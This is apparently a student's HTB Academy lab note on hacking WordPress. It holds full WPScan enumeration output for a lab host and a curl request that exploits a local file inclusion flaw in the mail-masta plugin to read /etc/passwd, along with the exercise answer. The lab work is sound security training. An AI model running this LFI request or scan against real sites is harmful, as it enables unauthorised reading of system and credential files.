Project:: HTB
Type:: CBBH
Progress:: Completed
Tags:: 
Sites:: [HTB Academy](https://academy.hackthebox.com/module/17/section/44)
BackLinks:: 
OS related:: 
Walkthrough:: 
Note:: 

---
## Use the same [[Techniques/LFI|LFI]] vulnerability against your target and read the contents of the "/etc/passwd" file. Locate the only non-root user on the system with a login shell.
>Hint : The user has "/bin/bash" at the end of their entry in the "/etc/passwd" file.
- `sally.jones`
	- Plugin [[Enumeration]] : [[WPSCAN]]
		```txt hl:84
		╭─ /mn/H/No/CyberVault/Hac/A/B/H/Exploitation/11_Exploiting a Vulnerable Plugin ·············· ✔  9s  09:30:31
		╰─ wpscan --url http://$ip:$port/ -e ap -v -o wp_scan_ap.txt
		
		╭─ /mn/H/No/CyberVault/Hac/A/B/H/Exploitation/11_Exploiting a Vulnerable Plugin ·············· ✔  6s  09:30:38
		╰─ cat wp_scan_ap.txt
		_______________________________________________________________
		         __          _______   _____
		         \ \        / /  __ \ / ____|
		          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
		           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
		            \  /\  /  | |     ____) | (__| (_| | | | |
		             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
		
		         WordPress Security Scanner by the WPScan Team
		                         Version 3.8.25
		       Sponsored by Automattic - https://automattic.com/
		       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
		_______________________________________________________________
		
		[+] URL: http://94.237.62.195:59917/ [94.237.62.195]
		[+] Started: Tue Dec 26 09:30:34 2023
		
		Interesting Finding(s):
		
		[+] Headers
		 | Interesting Entry: Server: nginx
		 | Found By: Headers (Passive Detection)
		 | Confidence: 100%
		
		[+] XML-RPC seems to be enabled: http://94.237.62.195:59917/xmlrpc.php
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		 | References:
		 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
		 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
		 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
		
		[+] WordPress readme found: http://94.237.62.195:59917/readme.html
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		
		[+] Upload directory has listing enabled: http://94.237.62.195:59917/wp-content/uploads/
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 100%
		
		[+] The external WP-Cron seems to be enabled: http://94.237.62.195:59917/wp-cron.php
		 | Found By: Direct Access (Aggressive Detection)
		 | Confidence: 60%
		 | References:
		 |  - https://www.iplocation.net/defend-wordpress-from-ddos
		 |  - https://github.com/wpscanteam/wpscan/issues/1299
		
		[+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
		 | Found By: Rss Generator (Passive Detection)
		 |  - http://94.237.62.195:59917/feed/, <generator>https://wordpress.org/?v=5.1.6</generator>
		 |  - http://94.237.62.195:59917/comments/feed/, <generator>https://wordpress.org/?v=5.1.6</generator>
		
		[+] WordPress theme in use: ben_theme
		 | Location: http://94.237.62.195:59917/wp-content/themes/ben_theme/
		 | Readme: http://94.237.62.195:59917/wp-content/themes/ben_theme/readme.txt
		 | Style URL: http://94.237.62.195:59917/wp-content/themes/ben_theme/style.css?ver=5.1.6
		 | Style Name: Transportex
		 | Style URI: https://themeansar.com/free-themes/transportex/
		 | Description: Transportex is a transport, logistics & home movers WordPress theme with focus on create online transport logistics, truck, trucking, shipment, fleet, flat mover, moving company, shipping, warehouse, delivery, freight services, corporate, showcase,Air Freight, Sea Freight, Road Freight, Logistics Works, tracking, carrier, transport logistics, delivery, Routes, Warehousing, overland network, responsive creative portfolio, package, storage, multipurpose business, Transportex offers grid pattern, three different tile / grid blog layouts, page transitions and distinctive typography. It also includes easy to use and fast page builder siteorigin. Cargo adapts to every device, from smartphones and tablets to desktops. It comes with free updates and free support by our highly acclaimed team. demo at https://themeansar.com/themes/transportex-pro/
		 | Author: Themeansar
		 | Author URI: https://themeansar.com/
		 | License: GNU General Public License v3 or later
		 | License URI: http://www.gnu.org/licenses/gpl.html
		 | Tags: two-columns, three-columns, left-sidebar, right-sidebar, translation-ready, custom-background, custom-logo, featured-images, footer-widgets, full-width-template, blog
		 | Text Domain: transportex
		 |
		 | Found By: Css Style In Homepage (Passive Detection)
		 | Confirmed By: Css Style In 404 Page (Passive Detection)
		 |
		 | Version: 1.6.7 (80% confidence)
		 | Found By: Style (Passive Detection)
		 |  - http://94.237.62.195:59917/wp-content/themes/ben_theme/style.css?ver=5.1.6, Match: 'Version: 1.6.7'
		
		
		[i] Plugin(s) Identified:
		
		[+] mail-masta
		 | Location: http://94.237.62.195:59917/wp-content/plugins/mail-masta/
		 | Latest Version: 1.0 (up to date)
		 | Last Updated: 2014-09-19T07:52:00.000Z
		 |
		 | Found By: Urls In Homepage (Passive Detection)
		 | Confirmed By: Urls In 404 Page (Passive Detection)
		 |
		 | Version: 1.0 (80% confidence)
		 | Found By: Readme - Stable Tag (Aggressive Detection)
		 |  - http://94.237.62.195:59917/wp-content/plugins/mail-masta/readme.txt
		
		[+] photo-gallery
		 | Location: http://94.237.62.195:59917/wp-content/plugins/photo-gallery/
		 | Last Updated: 2023-12-21T15:09:00.000Z
		 | [!] The version is out of date, the latest version is 1.8.19
		 |
		 | Found By: Urls In Homepage (Passive Detection)
		 | Confirmed By: Urls In 404 Page (Passive Detection)
		 |
		 | Version: 1.5.34 (100% confidence)
		 | Found By: Query Parameter (Passive Detection)
		 |  - http://94.237.62.195:59917/wp-content/plugins/photo-gallery/css/jquery.mCustomScrollbar.min.css?ver=1.5.34
		 |  - http://94.237.62.195:59917/wp-content/plugins/photo-gallery/css/styles.min.css?ver=1.5.34
		 |  - http://94.237.62.195:59917/wp-content/plugins/photo-gallery/js/jquery.mCustomScrollbar.concat.min.js?ver=1.5.34
		 |  - http://94.237.62.195:59917/wp-content/plugins/photo-gallery/js/scripts.min.js?ver=1.5.34
		 | Confirmed By:
		 |  Readme - Stable Tag (Aggressive Detection)
		 |   - http://94.237.62.195:59917/wp-content/plugins/photo-gallery/readme.txt
		 |  Readme - ChangeLog Section (Aggressive Detection)
		 |   - http://94.237.62.195:59917/wp-content/plugins/photo-gallery/readme.txt
		
		[+] wp-google-places-review-slider
		 | Location: http://94.237.62.195:59917/wp-content/plugins/wp-google-places-review-slider/
		 | Last Updated: 2023-11-12T18:03:00.000Z
		 | [!] The version is out of date, the latest version is 13.1
		 |
		 | Found By: Urls In Homepage (Passive Detection)
		 | Confirmed By: Urls In 404 Page (Passive Detection)
		 |
		 | Version: 6.1 (80% confidence)
		 | Found By: Readme - Stable Tag (Aggressive Detection)
		 |  - http://94.237.62.195:59917/wp-content/plugins/wp-google-places-review-slider/README.txt
		
		[!] No WPScan API Token given, as a result vulnerability data has not been output.
		[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
		
		[+] Finished: Tue Dec 26 09:30:37 2023
		[+] Requests Done: 2
		[+] Cached Requests: 41
		[+] Data Sent: 626 B
		[+] Data Received: 19.618 KB
		[+] Memory used: 266.512 MB
		[+] Elapsed time: 00:00:03
		
		
		```
	- Read `/etc/passwd` : [[Techniques/LFI|LFI]]
		```txt
		╭─ /mn/H/No/CyberVault/Hac/A/B/Hacking Wordpess/3_Exploitation/11_Exploiting a Vulnerable Plugin ·· ✔  09:36:42
		╰─ curl "http://$ip:$port/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
		root:x:0:0:root:/root:/bin/ash
		bin:x:1:1:bin:/bin:/sbin/nologin
		daemon:x:2:2:daemon:/sbin:/sbin/nologin
		adm:x:3:4:adm:/var/adm:/sbin/nologin
		lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
		sync:x:5:0:sync:/sbin:/bin/sync
		shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
		halt:x:7:0:halt:/sbin:/sbin/halt
		mail:x:8:12:mail:/var/mail:/sbin/nologin
		news:x:9:13:news:/usr/lib/news:/sbin/nologin
		uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
		operator:x:11:0:operator:/root:/sbin/nologin
		man:x:13:15:man:/usr/man:/sbin/nologin
		postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
		cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
		ftp:x:21:21::/var/lib/ftp:/sbin/nologin
		sshd:x:22:22:sshd:/dev/null:/sbin/nologin
		at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
		squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
		xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
		games:x:35:35:games:/usr/games:/sbin/nologin
		cyrus:x:85:12::/usr/cyrus:/sbin/nologin
		vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
		ntp:x:123:123:NTP:/var/empty:/sbin/nologin
		smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
		guest:x:405:100:guest:/dev/null:/sbin/nologin
		nobody:x:65534:65534:nobody:/:/sbin/nologin
		mysql:x:100:101:mysql:/var/lib/mysql:/sbin/nologin
		nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin
		wp-user:x:1000:1000:Linux User,,,:/home/wp-user:/sbin/nologin
		sally.jones:x:1001:1001:Linux User,,,:/home/sally.jones:/bin/bash
		<br />
		<b>Fatal error</b>:  Uncaught Error: Call to a member function get_results() on null in /usr/src/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php:19
		Stack trace:
		#0 {main}
		  thrown in <b>/usr/src/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php</b> on line <b>19</b><br />
		```